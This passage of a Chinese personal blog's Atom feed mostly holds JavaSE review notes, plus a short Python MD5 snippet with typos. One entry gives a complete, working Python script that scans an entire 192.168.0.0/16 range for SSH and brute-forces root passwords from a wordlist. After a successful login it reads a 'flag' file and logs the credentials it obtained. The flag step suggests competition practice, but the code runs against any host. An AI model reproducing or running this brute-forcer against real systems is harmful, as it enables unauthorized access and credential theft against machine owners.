      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="内部类" scheme="http://liuhaoan.github.io/tags/%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    
      <category term="匿名内部类" scheme="http://liuhaoan.github.io/tags/%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    
      <category term="链式编程" scheme="http://liuhaoan.github.io/tags/%E9%93%BE%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>网络攻防之——Python实现MD5加密</title>
    <link href="http://liuhaoan.github.io/2019/04/08/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0MD5%E5%8A%A0%E5%AF%86/"/>
    <id>http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现MD5加密/</id>
    <published>2019-04-08T02:27:04.000Z</published>
    <updated>2019-04-08T11:47:03.871Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> hashilb</span><br><span class="line"></span><br><span class="line">str = input(“请输入要解密的字符串：”)</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line"><span class="comment">//创建MD5加密对象</span></span><br><span class="line"></span><br><span class="line">md5.update(str.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="comment">//把字符串以“utf-8”编码的形式传给MD5对象进行MD5加密</span></span><br><span class="line"></span><br><span class="line">print(md5.hexdigest())</span><br><span class="line"><span class="comment">//获取MD5加密后的16进制输出打印</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;
    
    </summary>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="MD5加密" scheme="http://liuhaoan.github.io/tags/MD5%E5%8A%A0%E5%AF%86/"/>
    
      <category term="Python" scheme="http://liuhaoan.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网络攻防之——Python实现ssh端口扫描并爆破</title>
    <link href="http://liuhaoan.github.io/2019/04/08/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0ssh%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B9%B6%E7%88%86%E7%A0%B4/"/>
    <id>http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现ssh端口扫描并爆破/</id>
    <published>2019-04-08T02:23:38.000Z</published>
    <updated>2019-04-09T02:02:24.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><blockquote><p>1、循环遍历出所有网段ip<br>2、利用多线程多并发同时探测22端口<br>3、把探测出来的存活机进行密码爆破<br>4、爆破成功则去拿到主机文件并保存ip、密码等信息<br>5、爆破不成功则记录该ip，进行后续操作。</p></blockquote><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line">import threading</span><br><span class="line">import pexpect</span><br><span class="line"><span class="keyword">from</span> socket import *</span><br><span class="line"></span><br><span class="line">key = [pexpect.TIMEOUT, <span class="string">"#"</span>, <span class="string">"\$"</span>, <span class="string">"&gt;"</span>, <span class="string">"&gt;&gt;&gt;"</span>, <span class="string">"&amp;"</span>]</span><br><span class="line">loginKey = [pexpect.TIMEOUT, <span class="string">"[p|P]assword"</span>, <span class="string">"yes"</span>]</span><br><span class="line"></span><br><span class="line">def getFlag(p, ret):</span><br><span class="line">p.sendline(<span class="string">"cat ../../../../flag"</span>)</span><br><span class="line">p.expect(key)</span><br><span class="line">ret += <span class="string">"flag:\n"</span> + str(p.before)</span><br><span class="line"><span class="builtin-name">print</span>(ret)</span><br><span class="line">file = open(<span class="string">"flag.txt"</span>, <span class="string">"a+"</span>)</span><br><span class="line">file.write(ret)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">def getPass(ip, passwd):</span><br><span class="line">p = pexpect.spawn(<span class="string">"ssh root@"</span> + ip, <span class="attribute">timeout</span>=1)</span><br><span class="line">try:</span><br><span class="line">b = p.expect(loginKey)</span><br><span class="line"><span class="keyword">if</span> b == 1:</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">b = p.expect(key)</span><br><span class="line"><span class="keyword">if</span> b &gt; 0:</span><br><span class="line">getFlag(p,<span class="built_in"> ip </span>+ <span class="string">"passwd:"</span> + passwd)</span><br><span class="line">return 1</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">finally:</span><br><span class="line">p.close()</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(ip):</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.settimeout(1)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">s.connect((ip, 22))</span><br><span class="line">b = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> open(<span class="string">"passwd"</span>):</span><br><span class="line">passwd = n.strip();</span><br><span class="line"><span class="keyword">if</span> getPass(ip, passwd) == 1:</span><br><span class="line">b = <span class="literal">False</span></span><br><span class="line">break</span><br><span class="line"><span class="keyword">if</span> b:</span><br><span class="line">file = open(<span class="string">"ip.txt"</span>, <span class="string">"a+"</span>)</span><br><span class="line">file.write(ip + <span class="string">"\n"</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">finally:</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(1, 255):</span><br><span class="line"><span class="keyword">for</span> nn <span class="keyword">in</span> range(1, 255):</span><br><span class="line"><span class="built_in">ip </span>= <span class="string">"192.168."</span> + str(n) + <span class="string">"."</span> + str(nn)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> len(threading.enumerate()) &lt; 255:</span><br><span class="line">break</span><br><span class="line">threading.Thread(<span class="attribute">target</span>=scan, args=(ip,)).start()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;实现步骤&quot;&gt;&lt;a href=&quot;#实现步骤&quot; class=&quot;headerlink&quot; title=&quot;实现步骤&quot;&gt;&lt;/a&gt;实现步骤&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、循环遍历出所有网段ip&lt;br&gt;2、利用多线程多并发同时探测22端口&lt;br&gt;3、把探测出来的存活机进行密码爆破&lt;br&gt;4、爆破成功则去拿到主机文件并保存ip、密码等信息&lt;br&gt;5、爆破不成功则记录该ip，进行后续操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;
    
    </summary>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="python" scheme="http://liuhaoan.github.io/tags/python/"/>
    
      <category term="ssh" scheme="http://liuhaoan.github.io/tags/ssh/"/>
    
      <category term="爆破" scheme="http://liuhaoan.github.io/tags/%E7%88%86%E7%A0%B4/"/>
    
      <category term="端口扫描" scheme="http://liuhaoan.github.io/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_包与权限修饰符</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%8C%85%E4%B8%8E%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-包与权限修饰符/</id>
    <published>2019-04-07T09:55:53.000Z</published>
    <updated>2019-04-08T11:49:47.182Z</updated>
    
    <content type="html"><![CDATA[<h1 id="包的意义"><a href="#包的意义" class="headerlink" title="包的意义"></a>包的意义</h1><blockquote><p>我们以后开发程序都是把源码写在一个个的<code>源文件</code>里面，而不是<code>在一个文件中创建很多的类</code>，包的用处就在这里，说白了包就是为了封装。<br><a id="more"></a></p></blockquote><h1 id="定义包的格式"><a href="#定义包的格式" class="headerlink" title="定义包的格式"></a>定义包的格式</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="title">包名;</span></span><br><span class="line">多级包用“.”分开</span><br></pre></td></tr></table></figure><ul><li><p>例子：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="title">java.util.Scanner;</span></span><br></pre></td></tr></table></figure><p>  在这里当然也可以把<code>Scanner</code>用<code>*</code>代替，<code>*</code>就是通配符，表示该目录下的所有包，但是效率没有导入具体的类高，因为<em>需要遍历该包所有类。<br>  ps：在开发中一般都不使用</em>，而是导入<code>具体的类</code>。</p></li></ul><h1 id="定义时的注意事项"><a href="#定义时的注意事项" class="headerlink" title="定义时的注意事项"></a>定义时的注意事项</h1><blockquote><p>1、必须是程序的<code>第一条</code>可执行语句<br>2、<code>package</code>在一个java文件中<code>只能有一个</code><br>3、包名的格式为域名倒写</p><ul><li>例：com.aikan0.add<br>这个add就是这个包的作用。</li></ul></blockquote><h1 id="生成包命令"><a href="#生成包命令" class="headerlink" title="生成包命令"></a>生成包命令</h1><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">javac </span>-d  . 源文件名</span><br></pre></td></tr></table></figure><ul><li>ps：了解一下就好了</li></ul><h1 id="面试题——package、import、class有没有顺序关系？"><a href="#面试题——package、import、class有没有顺序关系？" class="headerlink" title="面试题——package、import、class有没有顺序关系？"></a>面试题——package、import、class有没有顺序关系？</h1><ul><li>解答：<blockquote><p>有，并且<code>package &gt; import &gt; class</code></p></blockquote></li></ul><h1 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h1><ul><li>四种权限修饰符</li></ul><table><thead><tr><th></th><th>本类</th><th>同一个包下(子类和无关类)</th><th>不同包下(子类)</th><th>不同包下(无关类)</th></tr></thead><tbody><tr><td>private</td><td>Y</td><td></td><td></td><td></td></tr><tr><td>默认</td><td>Y</td><td>Y</td><td></td><td></td></tr><tr><td>protected</td><td>Y</td><td>Y</td><td>Y</td><td></td></tr><tr><td>public</td><td>Y</td><td>Y</td><td>Y</td><td>Y </td></tr></tbody></table><blockquote><p>ps：<code>protected</code>表示受保护的，就是保护权限只给给自己的子类，一般不用在<code>变量</code>，而是用在<code>成员变量</code>或者<code>成员方法</code>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;包的意义&quot;&gt;&lt;a href=&quot;#包的意义&quot; class=&quot;headerlink&quot; title=&quot;包的意义&quot;&gt;&lt;/a&gt;包的意义&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;我们以后开发程序都是把源码写在一个个的&lt;code&gt;源文件&lt;/code&gt;里面，而不是&lt;code&gt;在一个文件中创建很多的类&lt;/code&gt;，包的用处就在这里，说白了包就是为了封装。&lt;br&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="包" scheme="http://liuhaoan.github.io/tags/%E5%8C%85/"/>
    
      <category term="权限修饰符" scheme="http://liuhaoan.github.io/tags/%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_接口</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8E%A5%E5%8F%A3/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-接口/</id>
    <published>2019-04-07T09:22:46.000Z</published>
    <updated>2019-04-08T11:50:50.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="接口概述"><a href="#接口概述" class="headerlink" title="接口概述"></a>接口概述</h1><ul><li>从狭义的角度讲就是指java中的<code>interface</code></li><li>从广义的角度讲对<code>外提供规则</code>的都是接口 <a id="more"></a><h1 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h1></li><li>a : 接口用关键字<code>interface</code>表示    </li></ul><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> 接口名 </span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>b : 类实现接口用<code>implements</code>表示</li></ul><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名 <span class="keyword">implements</span> 接口名 </span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>c : 接口不能实例化<blockquote><p>那么，接口如何实例化呢?</p><p> 答：按照多态的方式来实例化。</p></blockquote></li></ul><ul><li><p>d : 接口的子类</p><blockquote><p>a : 可以是抽象类。但是意义不大。<br>b : 可以是具体类。要<code>重写接口中的所有抽象方法</code>。(推荐方案)</p></blockquote></li><li><p>注意事项：</p><blockquote><p>1、接口中的<code>成员变量</code>默认都是<code>常量</code>，他会自动加<code>public static final</code>关键字，并且可以互相交换位置，新手平时都手动给出。</p><p>2、接口中没有构造方法</p><p>3、接口是<code>干爹</code>，不是<code>亲爹</code>，子类<code>不能用super</code>访问父类中的内容，子类默认继承object类</p><p>4、接口中不能定义<code>非抽象</code>方法</p><p>5、类与接口是<code>实现</code>关系而非<code>继承</code>关系（干爹）</p><p>6、同一个类可以实现<code>多个</code>接口</p><ul><li>例子：<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deom</span> <span class="keyword">implements</span> <span class="title">InterA</span>,<span class="title">InterB</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><p>8、接口不能实现接口（implements），但是却可以继承（extends）</p></blockquote></li></ul><h1 id="类-与-接口的关系"><a href="#类-与-接口的关系" class="headerlink" title="类 与 接口的关系"></a>类 与 接口的关系</h1><ul><li>a : 类与类：<blockquote><p><code>继承关系</code>,只能单继承,可以多层继承。</p></blockquote></li></ul><ul><li>b : 类与接口：<blockquote><p><code>实现关系</code>,可以单实现,也可以多实现。<br>并且还可以在继承一个类的同时实现多个接口。</p></blockquote></li></ul><ul><li>c : 接口与接口：<blockquote><p><code>继承关系</code>,可以单继承,也可以多继承。</p></blockquote></li></ul><h1 id="抽象类-与-接口的区别："><a href="#抽象类-与-接口的区别：" class="headerlink" title="抽象类 与 接口的区别："></a>抽象类 与 接口的区别：</h1><ul><li>抽象类：<blockquote><p>和普通的类差不多，只是可以定义<code>抽象方法</code>而已</p></blockquote></li></ul><ul><li>接口：<blockquote><p>成员变量：只可以<code>常量</code><br>成员方法：只可以<code>抽象</code></p></blockquote></li></ul><h1 id="设计理念区别（重要）："><a href="#设计理念区别（重要）：" class="headerlink" title="设计理念区别（重要）："></a>设计理念区别（重要）：</h1><ul><li>抽象类：<blockquote><p>定义的是该继承体系的<code>共性功能</code></p><ul><li>例：每个学生都需要学习</li></ul></blockquote></li></ul><ul><li><p>接口：    定义的是该继承体系的<code>扩展性功能</code></p><blockquote><ul><li>例：每个学生在学校的学习方式都不一样，这样就需要扩展</li></ul></blockquote></li><li><p>设计理念区别：</p><blockquote><p>接口是<code>对动作的抽象</code>，抽象类是<code>对根源的抽象</code>。</p><p>抽象类表示的是：这个对象<code>是什么</code>。</p><p>接口表示的是：这个对象能<code>做什么</code>。</p><ul><li><p>比如：男人，女人，这两个类，他们的抽象类是人。<br>说明：他们都是人，他们的根源就是<code>人</code></p></li><li><p>又比如：人可以吃东西，狗也可以吃东西，可以把“吃东西”定义成一个接口，然后让这些类去实现它。<br>说明：他们都可以吃东西，他们的根源是<code>不同</code>的，但是做的动作却<code>相同</code>的。</p></li></ul></blockquote></li></ul><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><ul><li>在高级语言上，一个类只能继承一个类（抽象类）(正如人不可能同时是生物和非生物)，但是可以实现多个接口(吃饭接口、走路接口)。</li><li>当关注一个<code>事物的本质</code>的时候，用<code>抽象类</code>；</li><li>当关注一个<code>要做的动作</code>的时候，用<code>接口</code>。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;接口概述&quot;&gt;&lt;a href=&quot;#接口概述&quot; class=&quot;headerlink&quot; title=&quot;接口概述&quot;&gt;&lt;/a&gt;接口概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;从狭义的角度讲就是指java中的&lt;code&gt;interface&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;从广义的角度讲对&lt;code&gt;外提供规则&lt;/code&gt;的都是接口
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="接口" scheme="http://liuhaoan.github.io/tags/%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_抽象类</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8A%BD%E8%B1%A1%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-抽象类/</id>
    <published>2019-04-07T09:04:40.000Z</published>
    <updated>2019-04-08T11:50:10.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><ul><li>关键字：<code>abstract</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> 类名 </span>&#123;&#125;<span class="comment">//抽象类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;<span class="comment">//抽象方法</span></span><br></pre></td></tr></table></figure><ul><li>特点：<blockquote><p>1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口</p><p>2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化</p><p>3、abstract强制子类重写</p><a id="more"></a></blockquote></li><li><p>抽象类的几个问题：</p><blockquote><p>1、为什么不直接定义空方法？</p><p>解答：抽象类可以正确的引导使用者正确使用它们，<code>减少被误用</code></p><p>2、抽象类有什么作用？</p><p>解答：增强程序的<code>扩展性</code>和<code>兼容性</code>，<code>规范编程</code></p></blockquote></li><li><p>抽象类中的面试题：</p><blockquote><p>1、一个抽象类可以没有抽象方法，抽象类的意义是防止别人创建这个类的对象（抽象类不能被实例化）</p><p>2、<code>abstract</code>不能和<code>static</code>共存</p><p>原因：<code>static</code>让这个方法是静态方法，而静态方法可以用<code>类名.方法名</code>调用，而静态方法可以<code>类名.方法名</code>调用的底层原因是这个方法的对象已经在程序运行时就被创建，并且存到静态区域了，但是抽象方法是抽象的，不是具体的，所以它不能被实例化，进而<code>abstract</code>不能和<code>static</code>共存。</p><p>3、<code>abstract</code>不能和<code>final</code>共存</p><p>原因：<code>abstract</code>强制子类重写，而<code>final</code>表示最终的，它不让子类重写，这里形成了冲突。</p><p>4、<code>abstract</code>不能和<code>private</code>共存</p><p>原因：<code>abstract</code>强制子类重写，而<code>private</code>让子类访问不到，所以它们两个修饰符形成了冲突。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;抽象类&quot;&gt;&lt;a href=&quot;#抽象类&quot; class=&quot;headerlink&quot; title=&quot;抽象类&quot;&gt;&lt;/a&gt;抽象类&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;关键字：&lt;code&gt;abstract&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; 类名 &lt;/span&gt;&amp;#123;&amp;#125;			&lt;span class=&quot;comment&quot;&gt;//抽象类&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;eat&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;;		&lt;span class=&quot;comment&quot;&gt;//抽象方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;特点：&lt;blockquote&gt;
&lt;p&gt;1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口&lt;/p&gt;
&lt;p&gt;2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化&lt;/p&gt;
&lt;p&gt;3、abstract强制子类重写&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="抽象类" scheme="http://liuhaoan.github.io/tags/%E6%8A%BD%E8%B1%A1%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_多态</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%A4%9A%E6%80%81/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-多态/</id>
    <published>2019-04-07T07:58:33.000Z</published>
    <updated>2019-04-08T11:50:27.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="多态前提"><a href="#多态前提" class="headerlink" title="多态前提"></a>多态前提</h1><ul><li>a : 要有继承关系。</li><li>b : 要有方法重写。</li><li>c : 要有父类引用指向子类对象。<blockquote><p>例有一个父类<code>fu</code>和一个子类<code>zi</code>，那么父类引用子类对象为：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fu a</span> = new zi();</span><br></pre></td></tr></table></figure></blockquote></li></ul><a id="more"></a><h1 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h1><ul><li>编译、运行看左边(父类)</li></ul><blockquote><p>也就是创建对象后，<code>子类引用对象就优先调用子类(这样就不是多态了，因为它没有父类引用子类对象)</code>，<code>父类引用对象就优先调用父类（编译运行看左边）</code></p></blockquote><ul><li>解析：创建对象时，首先在堆中创建子类的对象（this），而这个子类的对象中有一个区域指向super，如果引用这个对象的是<code>父类</code>那么这个引用指向<code>super</code>区域，否则指向<code>this</code>区域</li></ul><h1 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h1><ul><li>编译看左边(父类)、运行看右边(子类)。<code>动态绑定</code></li></ul><blockquote><p>ps：父类中一定要有和子类一样的方法，父类中的那个方法可以理解为一个跳板跳转到子类中的方法中。</p></blockquote><h1 id="静态成员方法"><a href="#静态成员方法" class="headerlink" title="静态成员方法"></a>静态成员方法</h1><ul><li>与成员变量同理，<code>编译、运行看左边(父类)</code>，所以<code>多态中静态方法不存在重写</code></li></ul><h1 id="多态的弊端"><a href="#多态的弊端" class="headerlink" title="多态的弊端"></a>多态的弊端</h1><ul><li>父类引用不能使用子类<code>特有的属性和行为</code>，但是能通过<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zi b = <span class="comment">(zi)</span>a;    <span class="comment">//强转类型</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="多态的好处"><a href="#多态的好处" class="headerlink" title="多态的好处"></a>多态的好处</h1><blockquote><p>1、提高了代码的<code>维护性</code>(继承保证)</p><p>2、提高了代码的<code>扩展性</code>(由多态保证)</p></blockquote><h1 id="多态的使用"><a href="#多态的使用" class="headerlink" title="多态的使用"></a>多态的使用</h1><blockquote><p>1、开发是很少在创建对象的时候使用多态，而是直接创建<code>子类引用子类对象</code></p><p>2、在需要使用方法使代码简洁时，<code>当做参数</code>使用多态效果最好，因为<code>扩展性强</code></p><p>比如：现有三个类“<code>动物</code>”“<code>狗</code>”“<code>猫</code>”动物是父类，当我们有很多只狗和猫需要跑时，就可以使用<code>方法函数</code>来使代码简洁，在调用这个方法时可以<code>创建好一个 狗 或 猫  的对象然后传给参数</code>，这就需要使用到多态了，<code>如果不使多态</code>那么就需要给狗和猫分别创建一个函数。</p><ul><li><p>不过<code>在方法中使用多态</code>还有一个问题：狗 和 猫 都有各自<code>特有的功能与属性</code>，如果调用猫的功能，但是传入的对象是狗，那么就出错了。</p></li><li><p>解决方法：关键字    instanceof</p></li></ul><p>ps：了解一下，开发中用到的不多，一般都用到<code>方法重写</code></p><ul><li>代码实例：<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对象变量A   <span 